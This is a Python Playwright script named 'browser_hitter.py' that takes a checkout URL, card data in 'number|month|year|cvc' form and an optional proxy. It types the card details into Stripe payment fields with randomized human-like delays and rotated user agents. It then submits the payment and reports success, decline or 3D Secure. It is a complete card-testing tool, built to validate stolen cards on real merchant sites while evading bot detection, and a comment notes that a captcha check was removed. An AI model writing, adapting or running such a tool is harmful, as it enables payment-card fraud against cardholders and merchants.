import asyncio
import random
import sys
import os
import traceback
from playwright.async_api import async_playwright
from dotenv import load_dotenv

load_dotenv()

# User Agents for randomization
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"
]

async def hit_card(url, card_str, proxy=None):
    if '|' not in card_str:
        print(f"ERROR: Invalid card format {card_str}")
        return

    card, mm, yy, cvc = card_str.split('|')
    
    async with async_playwright() as p:
        # Launch browser (Headless=False to see it work, can be changed to True)
        # Launch browser (REQUIRED: headless=True for Render/Linux servers)
        browser = await p.chromium.launch(
            headless=True, 
            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
        )
        
        # Random User Agent for this session
        ua = random.choice(USER_AGENTS)
        
        context_args = {"user_agent": ua}
        if proxy:
            # Handle socks5://user:pass@host:port or http://user:pass@host:port
            print(f"🌐 Using Proxy: {proxy}")
            context_args["proxy"] = {"server": proxy}
            
        context = await browser.new_context(**context_args)
        
        page = await context.new_page()
        
        print(f"🚀 Navigating to: {url}")
        try:
            # Optimize: use 'domcontentloaded' instead of 'networkidle' for faster response on slow networks
            await page.goto(url, wait_until="domcontentloaded", timeout=45000)
            
            # --- hCaptcha Check (REMOVED) ---
            pass

            # Find Stripe Iframes
            print("⏳ Waiting for Stripe fields...")
            try:
                await page.wait_for_selector('iframe[name^="__privateStripeFrame"]', timeout=45000)
            except:
                print("❌ Timed out waiting for Stripe iframe selector.")
            
            # Find the actual input frame by URL content
            frames = page.frames
            card_input_frame = None
            for f in frames:
                # Stripe Elements frames often have these in the URL
                if "stripe" in f.url and ("elements-inner-card" in f.url or "elements" in f.url):
                    card_input_frame = f
                    break
            
            if not card_input_frame:
                print("❌ Could not locate Stripe input iframe.")
                await browser.close()
                return

            # Human-like typing
            async def human_type(frame, selector, text):
                try:
                    await frame.wait_for_selector(selector, timeout=10000)
                    await frame.click(selector)
                    for char in text:
                        await frame.type(selector, char, delay=random.randint(50, 150))
                except Exception as e:
                    print(f"⚠️ Warning: Could not type into {selector}: {str(e)}")

            print("⌨️ Inputting card details...")
            # Common Stripe SDK input names
            await human_type(card_input_frame, 'input[name="cardnumber"]', card)
            await human_type(card_input_frame, 'input[name="exp-date"]', f"{mm}{yy}")
            await human_type(card_input_frame, 'input[name="cvc"]', cvc)
            
            print("🔘 Clicking Pay...")
            # Try to find the submit button on the MAIN page with various selectors
            # --- Result Detection (Refined for Accuracy) ---
            success_keywords = ["payment successful", "transaction complete", "charged successfully", "your order is confirmed"]
            failure_keywords = ["declined", "insufficient funds", "expired", "security code is incorrect", "card was declined"]
            
            submit_selectors = [
                'button[type="submit"]', 
                '.SubmitButton', 
                '#submit-button', 
                'button:has-text("Pay")',
                'button:has-text("Subscribe")',
                'button:has-text("Place order")'
            ]
            clicked = False
            for s in submit_selectors:
                if await page.is_visible(s):
                    print(f"✅ Found button: {s}")
                    await page.click(s)
                    clicked = True
                    break
            
            if not clicked:
                print("⚠️ Pay button not found by common selectors, trying generic button click...")
                await page.keyboard.press("Enter")
            
            # Wait for result
            print("⌛ Waiting for payment result (60s max)...")
            # We poll the content every 2 seconds for 40 seconds
            status_detected = False
            for _ in range(20):
                await asyncio.sleep(2)
                content = await page.content()
                content_lower = content.lower()
                
                # Check for Success
                if any(k in content for k in ["Successful", "Thank you", "Confirmed", "complete", "Order #", "succeeded"]):
                    print(f"SUCCESS: Payment successful for {card_str}")
                    status_detected = True
                    break
                
                # Check for Failure/Decline
                if any(k in content_lower for k in ["declined", "failed", "invalid", "zip check failed", "incorrect card number"]):
                    print(f"FAILURE: Card declined ({card_str})")
                    status_detected = True
                    break
                
                # Check for 3DS
                if any(k in content_lower for k in ["authenticate", "security", "verify", "3d secure"]):
                    print(f"3DS: 3D Secure Verification Required")
                    status_detected = True
                    break
            
            if not status_detected:
                print(f"UNKNOWN: Result not detected.")
                # Final check of the logs/URL to see if it moved away
                if "checkout" not in page.url and url not in page.url:
                    print(f"INFO: Success? Page redirected to {page.url}")

        except Exception as e:
            print(f"ERROR: {str(e)}")
            print(traceback.format_exc())
        finally:
            # Ensure browser and context are closed
            try:
                await browser.close()
            except:
                pass

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python browser_hitter.py <url> <card> [proxy]")
    else:
        target_url = sys.argv[1]
        card_data = sys.argv[2]
        proxy_url = sys.argv[3] if len(sys.argv) > 3 else None
        asyncio.run(hit_card(target_url, card_data, proxy_url))
